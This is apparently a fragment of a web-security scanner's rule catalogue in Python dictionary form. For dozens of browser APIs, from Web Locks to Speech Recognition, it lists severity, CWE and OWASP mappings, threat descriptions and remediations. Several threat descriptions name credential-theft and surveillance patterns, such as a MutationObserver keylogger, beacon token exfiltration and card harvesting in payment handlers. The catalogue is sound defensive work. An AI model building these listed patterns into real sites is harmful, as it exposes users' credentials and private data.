    "web_locks_security": {
        "severity": "MEDIUM",
        "short": "Web Locks API Timing Oracle / Lock Abuse",
        "cwe": "CWE-362", "owasp": "A02:2021",
        "threats": [
            "Lock name from URL param: locks.request(URL_PARAM) allows attacker to acquire or block any named lock via URL manipulation",
            "Lock contention timing oracle: lock acquisition wait time measured and transmitted — reveals when other tabs are executing critical sections (cross-tab side-channel)",
            "Lock state exfiltrated: locks.query() result transmitted to remote — currently held/pending lock names reveal cross-tab application state",
            "Lock never released: lock acquired with never-resolving promise callback — application-wide named lock held indefinitely, causing deadlock or DoS for other tabs",
            "Sensitive data exfil in lock: credentials processed inside exclusive lock callback and transmitted — exfiltration inside serialized critical section evades some monitoring",
        ],
        "remediation": [
            "Never derive lock names from URL parameters — hardcode lock names or use client-generated nonces",
            "Do not measure lock acquisition timing and transmit externally — avoid lock-based timing side-channels",
            "Do not transmit locks.query() results to remote endpoints — cross-tab lock state is not intended to be shared externally",
            "Always ensure lock callbacks resolve their promise — add try/finally blocks to guarantee lock release",
            "Avoid processing authentication credentials inside lock callbacks that also make network requests",
        ],
        "references": ["https://w3c.github.io/web-locks/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API"],
    },
    "shape_detection_security": {
        "severity": "HIGH",
        "short": "Shape Detection API Biometric / Surveillance",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Facial biometric exfiltration: FaceDetector bounding boxes/landmarks transmitted to remote — facial geometry data sent to attacker server (biometric surveillance)",
            "Barcode content exfiltration: BarcodeDetector rawValue transmitted — QR/barcode content (which may contain auth tokens, URLs, sensitive data) sent to server",
            "OCR text exfiltration: TextDetector rawValue transmitted — text extracted from images sent to remote without user consent",
            "Camera stream surveillance: detection running on getUserMedia stream — real-time video analyzed for faces/barcodes without clear user notification",
            "Continuous scan loop: detection in requestAnimationFrame/setInterval — ongoing automated scanning without any user-initiated trigger",
        ],
        "remediation": [
            "Never transmit FaceDetector results (bounding boxes, landmarks) to any remote endpoint — facial geometry is biometric data",
            "Display detected barcode/QR content to the user locally — do not relay rawValue to external servers",
            "Obtain explicit informed consent before running face or text detection on live camera streams",
            "Avoid setInterval/requestAnimationFrame detection loops — trigger detection only on explicit user action",
            "Implement strict CSP to prevent unauthorized script access to Shape Detection API results",
        ],
        "references": ["https://wicg.github.io/shape-detection-api/", "https://developer.mozilla.org/en-US/docs/Web/API/Barcode_Detection_API"],
    },
    "media_session_security": {
        "severity": "MEDIUM",
        "short": "Media Session API Playback Tracking",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Metadata exfiltrated: media title/artist/album transmitted to analytics — detailed media consumption profile built and sent to third party",
            "Playback position tracked: setPositionState result transmitted — precise listening/viewing timeline including skip patterns sent to remote",
            "Metadata from URL param: MediaMetadata title/artist from searchParams — attacker controls what appears in OS lock screen or browser media UI (spoofing)",
            "Artwork SSRF: artwork URL from URL parameter — media session requests image from attacker-controlled URL (server-side or browser-side SSRF probe)",
            "Action handler telemetry: play/pause/seek action handlers transmit to analytics — every user media control action tracked and exfiltrated",
        ],
        "remediation": [
            "Do not transmit MediaMetadata title, artist, or album values to analytics without explicit user consent",
            "Do not transmit setPositionState values — playback position tracking is a significant privacy violation",
            "Never derive MediaMetadata fields from URL parameters — hardcode or fetch from authenticated API",
            "Restrict artwork URLs to same-origin or pre-approved CDN origins — never use URL parameter as artwork URL",
            "Avoid making network requests inside mediaSession.setActionHandler callbacks",
        ],
        "references": ["https://w3c.github.io/mediasession/", "https://developer.mozilla.org/en-US/docs/Web/API/MediaSession"],
    },
    "badging_api_security": {
        "severity": "MEDIUM",
        "short": "Web Badging API Count Injection / Surveillance",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Badge count from URL param: setAppBadge(URL_PARAM) allows attacker to set arbitrary notification count — misleading badge number via URL crafting",
            "Badge reflects sensitive counts: badge displays auth/payment/invoice count — internal sensitive business data exposed on OS home screen/dock",
            "Auto-set on load: badge silently set on page load — notification count revealed without user interaction, fingerprinting timing of server response",
            "Count exfiltrated: badge count transmitted to analytics after set — notification count history sent to third-party analytics (activity fingerprinting)",
            "Server-controlled badge: server response controls badge count — malicious server can display false/alarming notification counts to manipulate user",
        ],
        "remediation": [
            "Never derive setAppBadge() count from URL parameters — compute badge count from local authenticated state only",
            "Do not use badge count to reflect authentication, payment, or security alert counts — use generic unread count only",
            "Only set badge in response to explicit user actions or authenticated push notifications",
            "Do not transmit badge count values to analytics endpoints",
            "Validate server response values before passing to setAppBadge() — sanitize and cap the count value",
        ],
        "references": ["https://w3c.github.io/badging/", "https://developer.mozilla.org/en-US/docs/Web/API/Badging_API"],
    },
    "content_index_security": {
        "severity": "MEDIUM",
        "short": "Content Index API Sensitive Page Indexing",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Index entry from URL param: index.add() content from URL parameter — attacker adds arbitrary URLs to offline content index via link crafting",
            "Sensitive pages indexed: auth/payment/admin URLs in Content Index — pages requiring authentication made available without auth check in offline mode",
            "Content inventory exfiltrated: index.getAll() transmitted to remote — full list of indexed offline pages sent to server (reveals offline content configuration)",
            "Indexed URLs disclosed: URL values from getAll() transmitted — user's offline content URLs sent to analytics (navigation history fingerprinting)",
            "Cross-origin content indexed: index.add() with absolute external URL — content from other origins pulled into service worker offline cache",
        ],
        "remediation": [
            "Never derive index.add() content from URL parameters — hardcode or validate all content index entries against an allowlist",
            "Only index publicly accessible, non-authenticated content in the Content Index",
            "Do not transmit index.getAll() results to any remote endpoint",
            "Restrict Content Index to same-origin relative URLs — avoid absolute external URLs in index entries",
            "Audit all service worker Content Index registrations during security review",
        ],
        "references": ["https://wicg.github.io/content-index/spec/", "https://developer.mozilla.org/en-US/docs/Web/API/Content_Index_API"],
    },
    "pwa_manifest_security": {
        "severity": "HIGH",
        "short": "PWA Manifest Misconfiguration / Launch Hijack",
        "cwe": "CWE-601", "owasp": "A05:2021",
        "threats": [
            "External start_url: PWA start_url is absolute external URL — installed PWA launches to attacker-controlled page instead of app",
            "Overly broad scope: scope is '/' (entire origin) — no path restriction; all origin URLs are within PWA context enabling unintended PWA behavior",
            "Sensitive params in shortcuts: shortcut URL contains token/auth query parameters — credentials embedded in manifest, visible to device OS",
            "Dangerous permissions in manifest: camera/microphone/geolocation/payment permissions declared — broad permissions granted at install time without per-use prompts",
            "handle_links preferred: all matching links from other apps intercepted — user navigates from external app and PWA opens without browser choice dialog",
        ],
        "remediation": [
            "Never use absolute external URLs in start_url — use relative paths within the same origin",
            "Restrict scope to the minimum required path prefix (e.g., '/app/') rather than '/'",
            "Remove authentication tokens and sensitive parameters from shortcut URLs in manifest",
            "Only declare permissions that are strictly necessary for core PWA functionality",
            "Set handle_links to 'auto' unless the app specifically requires intercepting all external links",
        ],
        "references": ["https://www.w3.org/TR/appmanifest/", "https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Guides/Making_PWAs_installable"],
    },
    "before_install_prompt_security": {
        "severity": "MEDIUM",
        "short": "BeforeInstallPrompt Deceptive Install Abuse",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "threats": [
            "Auto-prompt on load: install dialog shown on DOMContentLoaded without user gesture — aggressive install solicitation violating browser intent",
            "Prompt from URL param: install dialog triggered by URL parameter — attacker forces install prompt by crafting a URL link",
            "Repeated prompt loop: prompt() re-called in setTimeout/setInterval — install harassment loop, re-prompting user repeatedly after dismiss",
            "Deceptive context: prompt shown labelled as 'download', 'security update', or 'required action' — social engineering PWA install as fake software",
            "Install choice exfiltrated: userChoice outcome (accepted/dismissed) sent to analytics — user's install decision tracked and transmitted",
        ],
        "remediation": [
            "Only call deferredPrompt.prompt() in response to explicit user gestures (e.g., button click)",
            "Never trigger install prompt from URL parameters — ignore searchParams when deciding to show prompt",
            "Do not re-prompt after user dismissal — respect the browser's rate-limiting intent",
            "Label install buttons honestly — do not mislabel as 'download', 'update', or 'security' buttons",
            "Do not transmit userChoice outcome to analytics endpoints",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent", "https://web.dev/customize-install/"],
    },
    "ink_api_security": {
        "severity": "HIGH",
        "short": "Ink API Handwriting Surveillance",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Stroke data exfiltrated: ink stroke/point coordinates transmitted to remote — handwritten input (may include signatures, PINs, passwords) exfiltrated",
            "Pressure/tilt biometric exfiltrated: stylus pressure, tiltX, tiltY transmitted — unique stylus pressure profile enables biometric fingerprinting across sessions",
            "Presenter target from URL param: Ink API requestPresenter() target from URL parameter — attacker redirects low-latency ink rendering to controlled DOM element",
            "Continuous pointermove recording: all pointer movement collected in loop — complete stylus trace recorded for offline handwriting analysis",
            "Ink data stored to localStorage: stroke data written to localStorage — handwritten content persisted across sessions and accessible to all origin scripts",
        ],
        "remediation": [
            "Never transmit ink stroke coordinates, pressure, or tilt values to remote servers",
            "Process handwriting recognition entirely on-device — do not relay raw ink data to any endpoint",
            "Do not derive requestPresenter() target element from URL parameters",
            "Limit ink point collection to the duration of an active user gesture — clear collected points on pointer-up",
            "Do not store raw ink stroke data in localStorage or sessionStorage",
        ],
        "references": ["https://wicg.github.io/ink-enhancement/", "https://developer.mozilla.org/en-US/docs/Web/API/Ink_API"],
    },
    "opfs_security": {
        "severity": "HIGH",
        "short": "OPFS Arbitrary Write / Credential Storage",
        "cwe": "CWE-552", "owasp": "A01:2021",
        "threats": [
            "Write from URL param: OPFS file written with content from URL parameter — attacker injects arbitrary data into origin-private filesystem via URL manipulation",
            "Credentials written to OPFS: auth tokens/passwords written to OPFS files — credentials persisted in origin-private storage accessible to all origin scripts and service workers",
            "File content exfiltrated: OPFS file content read and transmitted to remote — sensitive private file data exfiltrated to attacker server",
            "Directory listing exfiltrated: file names from OPFS directory transmitted — private file inventory reveals structure of sensitive stored data",
            "Sync handle in main thread: FileSystemSyncAccessHandle used alongside main thread APIs — sync file handles are Worker-only; misuse indicates sandboxing bypass or prototype pollution attempt",
        ],
        "remediation": [
            "Never write content from URL parameters, hash, or searchParams to OPFS files",
            "Do not store authentication credentials, API keys, or session tokens in OPFS — use secure in-memory storage or cryptographic key stores",
            "Encrypt sensitive data before writing to OPFS — use Web Crypto API with a user-derived key",
            "Do not transmit OPFS file contents or directory listings to remote endpoints",
            "FileSystemSyncAccessHandle should only be used inside dedicated Web Workers — audit for main-thread usage",
        ],
        "references": ["https://fs.spec.whatwg.org/", "https://developer.mozilla.org/en-US/docs/Web/API/File_System_API/Origin_private_file_system"],
    },
    "webtransport_security": {
        "severity": "HIGH",
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "description": "WebTransport QUIC channel misuse — SSRF via URL param, credential exfiltration over QUIC stream, external endpoint connection, data relay to other transports.",
        "remediation": [
            "Validate and allowlist WebTransport server URLs — never derive from user-controlled input",
            "Do not transmit credentials, tokens, or localStorage data over WebTransport streams",
            "Implement Content-Security-Policy connect-src to restrict WebTransport endpoints",
            "Audit WebTransport usage for covert relay patterns bridging to WebSocket or fetch",
        ],
        "references": ["https://www.w3.org/TR/webtransport/", "https://cwe.mitre.org/data/definitions/918.html"],
    },
    "webgpu_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-200",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "WebGPU API misuse — GPU adapter hardware fingerprinting, compute timing side channel, buffer data from URL parameters, compute results exfiltrated to remote endpoints.",
        "remediation": [
            "Do not transmit GPU adapter name, vendor, or limits to remote analytics endpoints",
            "Avoid using GPU compute timing as a side-channel oracle for cryptographic operations",
            "Sanitize URL parameter data before using as GPU buffer content",
            "Review WebGPU compute pipeline outputs for unintended data exfiltration",
        ],
        "references": ["https://www.w3.org/TR/webgpu/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "compute_pressure_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Compute Pressure API surveillance — CPU pressure state exfiltrated to server, activity inference via serious/critical threshold tied to auth/payment flow, continuous monitoring pattern.",
        "remediation": [
            "Do not transmit Compute Pressure state or factor values to remote analytics endpoints",
            "Avoid tying CPU pressure thresholds to sensitive user flows (auth, payments)",
            "Limit PressureObserver frequency — do not poll via setInterval or requestAnimationFrame",
            "Disclose Compute Pressure API usage in privacy policy if monitoring user system state",
        ],
        "references": ["https://wicg.github.io/compute-pressure/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "background_fetch_security": {
        "severity": "HIGH",
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "description": "Background Fetch API misuse — SSRF via URL param in backgroundFetch.fetch(), background credential upload, auth token POST via background channel, large file exfiltration pattern.",
        "remediation": [
            "Hardcode or strictly validate Background Fetch URLs — never source from URL parameters",
            "Do not include authentication tokens or sensitive storage data in background fetch requests",
            "Restrict Background Fetch endpoints using CSP connect-src directive",
            "Audit background fetch handlers in Service Workers for unintended data transmission",
        ],
        "references": ["https://wicg.github.io/background-fetch/", "https://cwe.mitre.org/data/definitions/918.html"],
    },
    "fedcm_security": {
        "severity": "HIGH",
        "cwe": "CWE-287",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "FedCM misuse — attacker-controlled configURL enables malicious IdP injection, IdentityCredential token exfiltrated, silent auto sign-in bypasses user consent, nonce from URL param enables replay attacks.",
        "remediation": [
            "Hardcode FedCM configURL — never derive from URL parameters or user input",
            "Do not transmit IdentityCredential tokens to third-party analytics endpoints",
            "Avoid mediation 'silent' unless absolutely necessary and with explicit user awareness",
            "Generate nonces server-side — never accept from client-side URL parameters",
        ],
        "references": ["https://fedidcg.github.io/FedCM/", "https://cwe.mitre.org/data/definitions/287.html"],
    },
    "shared_storage_security": {
        "severity": "HIGH",
        "cwe": "CWE-200",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Shared Storage API misuse — PII/credentials written enabling cross-site exposure, selectURL selection oracle for cross-site profiling, value from URL param enables injection, cross-site read and exfiltration.",
        "remediation": [
            "Never store PII, credentials, or tokens in Shared Storage — it's a cross-site data store",
            "Do not transmit selectURL results to external endpoints",
            "Validate all values written to Shared Storage — never source directly from URL parameters",
            "Implement server-side controls and audit Shared Storage worklet operations regularly",
        ],
        "references": ["https://wicg.github.io/shared-storage/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "fenced_frame_security": {
        "severity": "HIGH",
        "cwe": "CWE-668",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Fenced Frame isolation bypass attempts — URL from URL param loads attacker content, reportEvent leaks PII, postMessage/parent communication attempts break isolation, cookie/storage access in fenced context.",
        "remediation": [
            "Hardcode Fenced Frame URLs — never derive src or config from URL parameters",
            "Only include non-sensitive event data in fence.reportEvent() calls",
            "Do not attempt parent communication (postMessage, window.parent) from Fenced Frame context",
            "Avoid accessing document.cookie or localStorage from within Fenced Frames",
        ],
        "references": ["https://wicg.github.io/fenced-frame/", "https://cwe.mitre.org/data/definitions/668.html"],
    },
    "text_fragment_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-200",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Text Fragment (:~:text=) misuse — scroll oracle via IntersectionObserver timing, link injection from URL parameter enables highlight injection, highlighted text content exfiltrated, timing-based text presence detection.",
        "remediation": [
            "Do not construct :~:text= URLs from user-supplied input without sanitization",
            "Avoid using IntersectionObserver to detect text fragment scroll position and transmitting results",
            "Do not exfiltrate highlighted text content to remote endpoints",
            "Implement Content-Security-Policy to limit fetch/beacon destinations",
        ],
        "references": ["https://wicg.github.io/scroll-to-text-fragment/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "attribution_reporting_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Attribution Reporting API misuse — PII (email/userId) embedded in ad source registration, cross-origin attribution destination sends conversion data to third parties, filterData used for user identification.",
        "remediation": [
            "Never include PII (email, userId, phone) in Attribution Reporting source registrations",
            "Restrict attributionDestination to same-origin or explicitly trusted first-party domains",
            "Use opaque filterData — avoid embedding user identifiers that could re-identify users",
            "Audit Attribution Reporting headers with privacy review before deployment",
        ],
        "references": ["https://wicg.github.io/attribution-reporting-api/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "storage_bucket_security": {
        "severity": "HIGH",
        "cwe": "CWE-312",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Storage Bucket API misuse — credentials/tokens stored in persistent isolated buckets, bucket name from URL param enables attacker-controlled access, bucket enumeration transmitted to remote endpoint.",
        "remediation": [
            "Never store auth tokens, passwords, or session credentials in Storage Buckets",
            "Hardcode bucket names — never derive from URL parameters or user input",
            "Do not transmit storageBuckets.keys() results to external analytics endpoints",
            "Use expiration on Storage Buckets to limit credential persistence window",
        ],
        "references": ["https://wicg.github.io/storage-buckets/", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "payment_handler_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-359",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Payment Handler API misuse — excessive PII delegation (name/email/phone/shipping), payment instrument key/details exfiltrated, card number/CVV harvested in payment event handler.",
        "remediation": [
            "Only delegate payment fields (payerName/payerEmail/etc.) that are strictly necessary",
            "Do not transmit instrumentKey or payment instrument details to analytics endpoints",
            "Never access or store cardNumber, CVV, or PIN from within Payment Handler event listeners",
            "Implement strict CSP and SRI to prevent payment handler script tampering",
        ],
        "references": ["https://w3c.github.io/payment-handler/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "interest_group_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Protected Audience/FLEDGE misuse — PII embedded in interest group membership (user identification in ad targeting), biddingLogicURL from URL param enables script injection, auction results exfiltrated.",
        "remediation": [
            "Never use PII (email, userId) as interest group names — use opaque identifiers",
            "Hardcode biddingLogicURL — never derive from URL parameters or user input",
            "Do not transmit runAdAuction() results to external analytics endpoints",
            "Conduct privacy review before deploying Protected Audience API on production",
        ],
        "references": ["https://wicg.github.io/turtledove/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "topics_api_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Topics API misuse — browsing interest profile exfiltrated to remote analytics, topics stored persistently in localStorage, topics combined with PII linking interest categories to real user identity.",
        "remediation": [
            "Do not transmit document.browsingTopics() results to remote analytics servers",
            "Avoid storing browsing topics in localStorage, cookies, or IndexedDB",
            "Never combine Topics API data with PII (email, userId) in the same request",
            "Review Topics API usage against GDPR/CCPA consent requirements",
        ],
        "references": ["https://patcg-individual-drafts.github.io/topics/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "private_aggregation_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Private Aggregation API misuse — PII embedded in histogram bucket keys enables user re-identification, enableDebugMode bypasses differential privacy noise guarantees, bucket key from URL param enables attacker-controlled histogram manipulation.",
        "remediation": [
            "Use only opaque, non-identifying values as Private Aggregation bucket keys",
            "Never call privateAggregation.enableDebugMode() in production environments",
            "Hardcode bucket key values — never derive from URL parameters or user input",
            "Conduct privacy review before deploying Private Aggregation API worklets",
        ],
        "references": ["https://patcg-individual-drafts.github.io/private-aggregation-api/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "custom_elements_security": {
        "severity": "HIGH",
        "cwe": "CWE-1321",
        "owasp": "A03:2021 - Injection",
        "description": "Custom Elements misuse — HTMLElement.prototype modified from URL parameter (prototype pollution), customElements.define() tag name from URL param (element registration injection), Shadow DOM used to exfiltrate credentials.",
        "remediation": [
            "Never modify HTMLElement.prototype or customElements using user-controlled URL parameter data",
            "Hardcode custom element tag names — never source from URL parameters",
            "Audit Shadow DOM content within custom elements for credential or PII access",
            "Use Content-Security-Policy to restrict fetch/beacon destinations from custom element logic",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/custom-elements.html", "https://cwe.mitre.org/data/definitions/1321.html"],
    },
    "dynamic_import_security": {
        "severity": "HIGH",
        "cwe": "CWE-829",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "description": "Dynamic import() misuse — module specifier from URL parameter enables attacker-controlled script injection, string concatenation in import() URL enables injection, import.meta data exfiltrated to remote endpoint.",
        "remediation": [
            "Never pass URL parameter values directly to import() — use an allowlist of permitted module paths",
            "Avoid string concatenation or template literals when building import() specifiers",
            "Do not transmit import.meta.url or other module metadata to external endpoints",
            "Implement Subresource Integrity (SRI) for dynamically imported scripts",
        ],
        "references": ["https://tc39.es/ecma262/#sec-import-calls", "https://cwe.mitre.org/data/definitions/829.html"],
    },
    "mutation_observer_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A03:2021 - Injection",
        "description": "MutationObserver used for DOM surveillance — input/textarea/password value monitored and exfiltrated (DOM keylogger), password/token fields watched for credential harvest, full document observed with subtree:true, addedNodes content exfiltrated.",
        "remediation": [
            "Never monitor input/password field mutations and transmit values to remote endpoints",
            "Limit MutationObserver scope — avoid observing entire document with subtree:true for analytics purposes",
            "Do not transmit MutationObserver addedNodes content to external servers",
            "Implement Content-Security-Policy to restrict fetch/beacon destinations",
        ],
        "references": ["https://dom.spec.whatwg.org/#mutation-observers", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "eventsource_security": {
        "severity": "HIGH",
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "description": "EventSource (SSE) misuse — SSE URL sourced from URL parameter enables SSRF via SSE connection, external SSE URL connected without verification, SSE message data containing auth/token relayed to external endpoint.",
        "remediation": [
            "Hardcode EventSource URLs — never derive from URL parameters or user input",
            "Validate and allowlist EventSource endpoint URLs",
            "Do not relay SSE message data containing auth/credentials to external endpoints",
            "Implement CSP connect-src to restrict EventSource connection destinations",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/server-sent-events.html", "https://cwe.mitre.org/data/definitions/918.html"],
    },
    "login_status_api_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-287",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "Login Status API misuse — login state transmitted to remote servers for surveillance, setStatus('logged-in') triggered on page load (false state injection enabling FedCM bypass), login status controlled by URL parameter.",
        "remediation": [
            "Do not transmit navigator.login state to remote analytics or third-party servers",
            "Only call navigator.login.setStatus() in response to genuine authentication events",
            "Never derive login status from URL parameters — always use server-side authentication state",
            "Audit Login Status API usage for compliance with identity provider specifications",
        ],
        "references": ["https://wicg.github.io/login-status/", "https://cwe.mitre.org/data/definitions/287.html"],
    },
    "reporting_observer_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-200",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "ReportingObserver misuse — browser intervention/deprecation reports exfiltrated externally, feature-policy-violation reports transmitted for policy probing, deprecation events used for browser version fingerprinting.",
        "remediation": [
            "Do not transmit ReportingObserver reports to remote analytics servers",
            "Avoid using ReportingObserver to detect browser feature-policy-violations (security policy probing)",
            "Do not use deprecation reports for browser fingerprinting",
            "If using ReportingObserver for monitoring, ensure reports stay within same-origin infrastructure",
        ],
        "references": ["https://www.w3.org/TR/reporting/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "beacon_api_security": {
        "severity": "HIGH",
        "cwe": "CWE-201",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Beacon API misuse — sendBeacon() transmits credentials/tokens as covert exfiltration channel, beacon to external URL without validation, beacon URL from URL parameter (SSRF), PII transmitted without consent.",
        "remediation": [
            "Never include auth tokens, session cookies, or localStorage credentials as sendBeacon payload",
            "Validate and allowlist sendBeacon destination URLs — never source from URL parameters",
            "Implement Content-Security-Policy connect-src to restrict beacon destinations",
            "Ensure GDPR/CCPA consent before transmitting PII via sendBeacon",
        ],
        "references": ["https://www.w3.org/TR/beacon/", "https://cwe.mitre.org/data/definitions/201.html"],
    },
    "pointer_lock_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Pointer Lock API misuse — movementX/Y mouse data transmitted to remote (behavioral surveillance), auto-lock on page load without explicit user action, continuous mousemove tracking with pointer lock (biometric fingerprinting).",
        "remediation": [
            "Do not transmit pointer lock movementX/Y data to remote analytics endpoints",
            "Only call requestPointerLock() in response to explicit user gestures, not on page load",
            "Avoid collecting continuous mousemove data streams during pointer lock for surveillance",
            "Disclose pointer lock usage and purpose to users in privacy policy",
        ],
        "references": ["https://www.w3.org/TR/pointerlock/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "history_api_security": {
        "severity": "HIGH",
        "cwe": "CWE-601",
        "owasp": "A03:2021 - Injection",
        "description": "History API misuse — pushState URL sourced from URL parameter enables URL spoofing for phishing, external URL pushed to history bar (address bar phishing technique), sensitive auth/token data stored in history state object.",
        "remediation": [
            "Validate history.pushState/replaceState URL arguments — never accept raw URL param values",
            "Only push same-origin URLs to history — reject external URL schemes",
            "Never store auth tokens, session data, or passwords in history.pushState state objects",
            "Implement server-side URL validation for any URL used in history manipulation",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/history.html", "https://cwe.mitre.org/data/definitions/601.html"],
    },
    "credentialless_iframe_security": {
        "severity": "MEDIUM",
        "cwe": "CWE-668",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Credentialless iframe isolation bypass attempts — localStorage/cookie access from anonymous frame, postMessage exfiltrates auth/token from credentialless context, fetch with credentials:include bypasses credentialless intent.",
        "remediation": [
            "Do not attempt to access localStorage, sessionStorage, or cookies from credentialless iframe context",
            "Avoid postMessage communication of credentials from credentialless frames to parent",
            "Do not use fetch with credentials:include inside credentialless iframes",
            "Review credentialless iframe implementations against COEP isolation requirements",
        ],
        "references": ["https://wicg.github.io/anonymous-iframe/", "https://cwe.mitre.org/data/definitions/668.html"],
    },
    "drag_drop_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Drag and Drop API misuse — dataTransfer.getData() content transmitted externally, sensitive credentials set as draggable data, dropped files automatically uploaded to remote server.",
        "remediation": [
            "Validate drag-and-drop data content before transmitting — never auto-exfiltrate drag data",
            "Do not set auth tokens, passwords, or API keys as dataTransfer drag data",
            "Require explicit user confirmation before uploading dropped files to servers",
            "Implement CSP to restrict file upload fetch/XHR destinations",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/dnd.html", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "form_data_security": {
        "severity": "HIGH",
        "cwe": "CWE-312",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "FormData API misuse — credentials/tokens appended as form fields in multipart upload, form field value sourced from URL parameter (attacker-controlled submission), file/blob uploaded to external endpoint.",
        "remediation": [
            "Never append auth tokens, API keys, or credentials as FormData fields",
            "Validate all FormData field values — never include raw URL parameter values",
            "Restrict file upload destinations to same-origin endpoints using CSP connect-src",
            "Implement CSRF protection for all FormData submissions",
        ],
        "references": ["https://xhr.spec.whatwg.org/#formdata", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "readable_stream_security": {
        "severity": "HIGH",
        "cwe": "CWE-201",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Readable Stream API misuse — stream containing credentials piped to external destination, stream piped to external URL/fetch, stream content from URL param, response tee'd with second copy exfiltrated.",
        "remediation": [
            "Validate Readable Stream pipeTo/pipeThrough destinations — never pipe to external URLs",
            "Do not create ReadableStream content from URL parameters",
            "Avoid tee()ing response streams and transmitting the second copy to external endpoints",
            "Monitor ReadableStream destinations with CSP connect-src restrictions",
        ],
        "references": ["https://streams.spec.whatwg.org/", "https://cwe.mitre.org/data/definitions/201.html"],
    },
    "structured_clone_security": {
        "severity": "HIGH",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Structured Clone/postMessage misuse — structuredClone() copies credentials for external transmission, cloned data posted to worker for processing, postMessage sends credentials to wildcard origin ('*') broadcasting to all frames.",
        "remediation": [
            "Do not use structuredClone() on credential-containing objects for the purpose of external transmission",
            "When posting cloned data to workers, ensure workers cannot transmit data to external destinations",
            "Never use postMessage with '*' origin when sending auth/credential data — specify exact target origin",
            "Implement postMessage receiver validation on the receiving end",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/structured-data.html", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "webgl_security": {
        "severity": "HIGH",
        "cwe": "CWE-94",
        "owasp": "A03:2021 - Injection",
        "description": "WebGL API misuse — GLSL shader source from URL parameter (shader injection), GPU framebuffer data exfiltrated via readPixels/toDataURL, WebGL extension list transmitted for browser fingerprinting.",
        "remediation": [
            "Never source WebGL shader code from URL parameters or user input",
            "Do not transmit WebGL readPixels/toDataURL output to remote endpoints",
            "Avoid transmitting getSupportedExtensions() results to analytics",
            "Implement CSP to restrict fetch/beacon destinations from WebGL applications",
        ],
        "references": ["https://www.khronos.org/webgl/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "speech_recognition_security": {
        "severity": "CRITICAL",
        "cwe": "CWE-359",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Speech Recognition API misuse — microphone auto-activated on page load without user gesture, audio transcripts transmitted to remote (audio surveillance), continuous recognition mode enables extended microphone capture.",
        "remediation": [
            "Only call SpeechRecognition.start() in response to explicit user actions, never on page load",
            "Do not transmit speech transcripts to remote analytics or third-party servers",
            "Avoid continuous recognition mode for features that don't require it",
            "Disclose microphone usage clearly to users before activation",
        ],
        "references": ["https://w3c.github.io/speech-api/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
